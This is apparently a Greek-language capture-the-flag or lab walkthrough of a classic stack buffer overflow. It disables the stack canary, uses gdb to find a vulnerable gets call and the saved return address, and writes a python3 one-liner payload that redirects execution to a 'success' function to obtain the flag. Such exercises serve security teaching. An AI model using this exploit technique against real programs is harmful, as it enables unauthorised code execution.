ΣΗΜΑΝΤΙΚΟ : Πριν κάνουμε οτιδήποτε, βεβαιώνουμε ότι έχουμε την πιο πρόσφατη έκδοση docker. Αλλιώς θα παρουσιαστεί πρόβλημα στο apt-get update κατα το
χτίσιμο του container.
gcc -fno-stack-protector -m32 vuln.c (με αυτό τον τρόπο αφαιρούμε το canary protection)
gdb ./a.out (Τρέχουμε το πρόγραμμα στον decompiler)
run (εκτελούμε το πρόγραμμα να δούμε πως τρέχει)
info func (βλέπουμε τις συναρτήσεις. η overflow μας ενδιαφέρει. Το success έχει επίσης ενδιαφέρον)
disas overflow (βλέπουμε τα περιέχομενα της συνάρτησης overflow. Το gets είναι vulnerable, οπότε βάζουμε ένα breakpoint εκεί και ένα στο lea.)
b *[gets_address]
b *[lea_address]
run (Τρέχουμε το πρόγραμμα και χτυπάμε στο πρώτο breakpoint.)
x/20x $esp (κοιτάμε τις 20 πρώτες διευθύνσεις του stack pointer)
c (Συνεχίζουμε)
Για κωδικό βάζουμε AAAAAAAA. Βλέπουμε ότι εμφανίζεται 2 φορές, 1 για κάθε τετράδα ως 0χ414141.
info frame (βλέπουμε που βρίσκεται ο return pointer. Μας ενδιαφέρει το saved eip.)
Από το σημείο που εμφανίζεται η πρώτη τετράδα με Α μέχρι το σημείο που είναι το return address, απέχουν 8 θεσεις (Στην 8η είναι το return address)
Άρα χρειαζόμαστε 7*4 = 28 Α για να φτάσουμε ακριβώς πριν το return address.
python3 -c 'print ("A"*28 + "\x55\x62\x55\x56")' > attack.txt
Με την παραπάνω εντολή φτιάχνουμε μια συμβολοσειρά με 28 Α. Έπειτα βάζουμε τη διεύθυνση της συνάρτησης
"success" έτσι ώστε να αναγκάσουμε το συγκεκριμένο function να εκτελεστεί.
Πατάμε "run" και ξανατρέχουμε το πρόγραμμα.
c
Στη θέση του κωδικού αντιγράφουμε την συμβολοσειρά στο αρχείο attack και την κάνουμε επικόλληση
c
Πήραμε τη σημαία.
